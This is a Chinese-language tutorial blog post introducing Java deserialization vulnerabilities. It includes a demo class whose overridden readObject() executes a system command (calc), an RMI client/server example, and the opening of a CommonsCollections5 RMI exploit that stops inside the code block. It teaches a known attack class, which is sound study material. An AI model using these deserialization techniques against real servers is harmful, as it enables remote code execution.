<!DOCTYPE html><html lang="[&quot;zh-CN&quot;,&quot;en&quot;,&quot;zh-HK&quot;,&quot;zh-TW&quot;,&quot;default&quot;]" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Java 反序列化漏洞入门 | Jckling's Blog</title><meta name="keywords" content="Java"><meta name="author" content="Jckling"><meta name="copyright" content="Jckling"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Java 反序列化漏洞入门，梳理 ysoserial 中的 POC">
<meta property="og:type" content="article">
<meta property="og:title" content="Java 反序列化漏洞入门">
<meta property="og:url" content="https://jckling.github.io/2021/09/16/Security/Java%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%85%A5%E9%97%A8/index.html">
<meta property="og:site_name" content="Jckling&#39;s Blog">
<meta property="og:description" content="Java 反序列化漏洞入门，梳理 ysoserial 中的 POC">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://github.com/frohoff/ysoserial/raw/master/ysoserial.png">
<meta property="article:published_time" content="2021-09-16T03:41:30.000Z">
<meta property="article:modified_time" content="2021-11-12T02:03:55.000Z">
<meta property="article:author" content="Jckling">
<meta property="article:tag" content="Java">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://github.com/frohoff/ysoserial/raw/master/ysoserial.png"><link rel="shortcut icon" href="/img/jckling/favicon.ico"><link rel="canonical" href="https://jckling.github.io/2021/09/16/Security/Java%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%85%A5%E9%97%A8/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//www.google-analytics.com" crossorigin=""/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google_site_verification" content="pZZt69mo0ndoxIJ1vjEe830lXbvD26aiVAZ-k0FWM5k"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script async="async" src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?20b7797c0b5f4e821c1449cd4c6c98c8";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script><script async="async" src="https://www.googletagmanager.com/gtag/js?id=UA-164555720-1"></script><script>window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date());
gtag('config', 'UA-164555720-1');
</script><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":false,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: true,
  islazyload: false,
  isanchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Java 反序列化漏洞入门',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2021-11-12 10:03:55'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="Jckling's Blog" type="application/atom+xml">
</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/jckling/avatar.jpg" onerror="onerror=null;src='/img/jckling/avatar_404.png'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">107</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">40</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-film"></i><span> Movie</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://github.com/frohoff/ysoserial/raw/master/ysoserial.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Jckling's Blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-film"></i><span> Movie</span></a></li></ul></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Java 反序列化漏洞入门</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="fa-fw post-meta-icon far fa-calendar-alt"></i><span class="post-meta-label">发表于</span><time datetime="2021-09-16T03:41:30.000Z" title="undefined 2021-09-16 11:41:30">2021-09-16</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Security/">Security</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Java 反序列化漏洞入门"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/2021/09/16/Security/Java%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%85%A5%E9%97%A8/#post-comment"><span class="waline-comment-count" id="/2021/09/16/Security/Java%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%85%A5%E9%97%A8/"></span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Java-反序列化漏洞"><a href="#Java-反序列化漏洞" class="headerlink" title="Java 反序列化漏洞"></a>Java 反序列化漏洞</h1><div class="note info flat"><p>利用方法多、造成危害有大有小；没有效果很好的检测工具，通常是有经验的从业人员发现。</p>
</div>

<p>序列化：把 Java 对象转换为字节序列的过程便于保存在内存、文件、数据库中，ObjectOutputStream 类的 <code>writeObject()</code> 方法可以实现序列化。</p>
<p>反序列化：把字节序列恢复为 Java 对象的过程，ObjectInputStream 类的 <code>readObject()</code> 方法用于反序列化。</p>
<p>漏洞成因：攻击者通过构造恶意输入，让反序列化产生非预期的对象，在此过程中执行构造的恶意代码。</p>
<h2 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h2><h3 id="重写-readObject-方法"><a href="#重写-readObject-方法" class="headerlink" title="重写 readObject 方法"></a>重写 readObject 方法</h3><p>默认的序列化与反序列化操作，实现的效果就是写入文件和从文件中读取。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> test1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test1</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span><span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">// 定义 obj 对象</span></span><br><span class="line">        String obj = <span class="string">&quot;hello world!&quot;</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 创建一个包含对象进行序列化信息的 object 数据文件</span></span><br><span class="line">        FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;D:/Study/test/object&quot;</span>);</span><br><span class="line">        ObjectOutputStream os = <span class="keyword">new</span> ObjectOutputStream(fos);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// writeObject() 方法将 obj 对象写入 object 文件</span></span><br><span class="line">        os.writeObject(obj);</span><br><span class="line">        os.close();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 从文件中反序列化 obj 对象</span></span><br><span class="line">        FileInputStream fis = <span class="keyword">new</span> FileInputStream(<span class="string">&quot;D:/Study/test/object&quot;</span>);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(fis);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 恢复对象</span></span><br><span class="line">        String obj2 = (String)ois.readObject();</span><br><span class="line">        System.out.print(obj2);</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>查看 object 文件中的内容（序列化的 obj）</p>
<ul>
<li><code>0xaced</code> 为 Java 对象序列化流的魔数，<code>0x0005</code> 为 Java 对象序列化的版本号，Java 对象序列化数据的前 4 个字节为 <code>AC ED 00 05</code></li>
</ul>
<img src="https://i.loli.net/2021/09/16/OD7GcKlSnPauLI4.png" >


<p>重写 readObject 函数，在其中调用计算器</p>
<ul>
<li>只有实现 Serializable 接口的类的对象才可以被序列化</li>
<li>重写了 <code>readObject()</code> 函数</li>
<li>默认的写方法 <code>writeObject()</code> 可以将非静态和非 transient 的字段序列化<ul>
<li>简单的对象序列化操作用默认方法即可</li>
</ul>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> test2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test2</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">// 定义 myObj 对象</span></span><br><span class="line">        MyObject myObj = <span class="keyword">new</span> MyObject();</span><br><span class="line">        myObj.name = <span class="string">&quot;hi&quot;</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 创建一个包含对象进行反序列化信息的 myobject 数据文件</span></span><br><span class="line">        FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;D:/Study/test/myobject&quot;</span>);</span><br><span class="line">        ObjectOutputStream os = <span class="keyword">new</span> ObjectOutputStream(fos);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// writeObject() 方法将 myObj 对象写入 myobject 文件</span></span><br><span class="line">        os.writeObject(myObj);</span><br><span class="line">        os.close();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 从文件中反序列化 obj 对象</span></span><br><span class="line">        FileInputStream fis = <span class="keyword">new</span> FileInputStream(<span class="string">&quot;D:/Study/test/myobject&quot;</span>);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(fis);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 恢复对象</span></span><br><span class="line">        MyObject objectFromDisk = (MyObject)ois.readObject();</span><br><span class="line">        System.out.println(objectFromDisk.name);</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyObject</span> <span class="keyword">implements</span> <span class="title">Serializable</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 重写 readObject() 方法</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 执行默认的 readObject() 方法</span></span><br><span class="line">        in.defaultReadObject();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 执行打开计算器程序命令</span></span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>执行该程序，在控制台输出 <code>hi</code> 并弹出计算器</p>
<img src="https://i.loli.net/2021/09/16/wFJmiW5eLQcaOkv.jpg">

<h3 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h3><p>RMI（Remote Method Invocation）：一种用于实现远程过程调用的应用程序编程接口，常见的两种接口实现为 JRMP（Java Remote Message Protocol ，Java 远程消息交换协议）以及 CORBA。</p>
<img src="https://i.loli.net/2021/09/16/5uDiW4J7vPRMHAX.png" >

<p>简单理解：服务器将提供的服务对象注册到注册表中，客户端查询注册表获得对象并调用</p>
<ol>
<li>服务端 Server.java 创建注册表，注册服务对象 <code>hello</code></li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> server;</span><br><span class="line"><span class="keyword">import</span> service.Hello;</span><br><span class="line"><span class="keyword">import</span> service.impl.HelloImpl;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Server</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String name = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">        Hello hello = <span class="keyword">new</span> HelloImpl();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 生成存根（Stub）</span></span><br><span class="line">        UnicastRemoteObject.exportObject(hello,<span class="number">1099</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 创建本机 1099 端口上的 RMI registry</span></span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 对象绑定到注册表中</span></span><br><span class="line">        registry.rebind(name, hello);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>远程接口定义及实现</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Hello.java</span></span><br><span class="line"><span class="keyword">package</span> service;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Hello</span> <span class="keyword">extends</span> <span class="title">Remote</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">echo</span><span class="params">(String message)</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// HelloImpl</span></span><br><span class="line"><span class="keyword">package</span> service.impl;</span><br><span class="line"><span class="keyword">import</span> service.Hello;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloImpl</span> <span class="keyword">implements</span> <span class="title">Hello</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">echo</span><span class="params">(String message)</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&quot;quit&quot;</span>.equalsIgnoreCase(message.toString()))&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Server will be shutdown!&quot;</span>);</span><br><span class="line">            System.exit(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;Message from client: &quot;</span> + message);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Server response:&quot;</span> + message;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>客户端 Client.java 调用远程对象</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> client;</span><br><span class="line"><span class="keyword">import</span> service.Hello;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">// 获取远程主机上的注册表</span></span><br><span class="line">        Registry registry = LocateRegistry.getRegistry(<span class="string">&quot;localhost&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">        String name = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 获取远程对象</span></span><br><span class="line">        Hello hello = (Hello)registry.lookup(name);</span><br><span class="line">        <span class="keyword">while</span>(<span class="keyword">true</span>)&#123;</span><br><span class="line">            Scanner sc = <span class="keyword">new</span> Scanner( System.in ); <span class="comment">// 读取输入</span></span><br><span class="line">            String message = sc.next();</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 调用远程方法</span></span><br><span class="line">            hello.echo(message);</span><br><span class="line">            <span class="keyword">if</span>(message.equals(<span class="string">&quot;quit&quot;</span>))&#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行 Server 提供 Hello 服务，运行 Client 查询 hello 远程服务对象，读取控制台运行并调用。</p>
<img src="https://i.loli.net/2021/09/16/eJc36u7bRKvmaSE.jpg" >

<img src="https://i.loli.net/2021/09/16/cf2Qm6FZzPjOKax.jpg" >

<h3 id="RMI-反序列化漏洞（CC5）"><a href="#RMI-反序列化漏洞（CC5）" class="headerlink" title="RMI 反序列化漏洞（CC5）"></a>RMI 反序列化漏洞（CC5）</h3><blockquote>
<p> 利用了 CommonsCollections5<br> jdk1.8 之后对 AnnotationInvocationHandler 类做了限制，所以在 jdk1.8 版本就拿 BadAttributeValueExpException 进行替代</p>
</blockquote>
<p>漏洞成因：RMI 在传输数据的时候，会将数据序列化，在传输完成后再进行反序列化；客户端提供构造好的恶意数据，服务器端接收后进行反序列化触发代码执行。</p>
<ul>
<li>能够进行 RMI 通信</li>
<li>服务器引用第三方存在反序列化漏洞的包</li>
</ul>
<p>结合 Apache Commons Collections 反序列化漏洞，构造 POC</p>
<ul>
<li>jdk 8u121以下（这里选择 8u111 复现）</li>
<li><a target="_blank" rel="noopener" href="https://repo1.maven.org/maven2/commons-collections/commons-collections/3.1/commons-collections-3.1.jar">commons-collections-3.1.jar</a></li>
</ul>
<p>Server 和服务仍然使用上面的代码，修改 Client 的逻辑，构造能够触发代码执行的序列化对象。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span 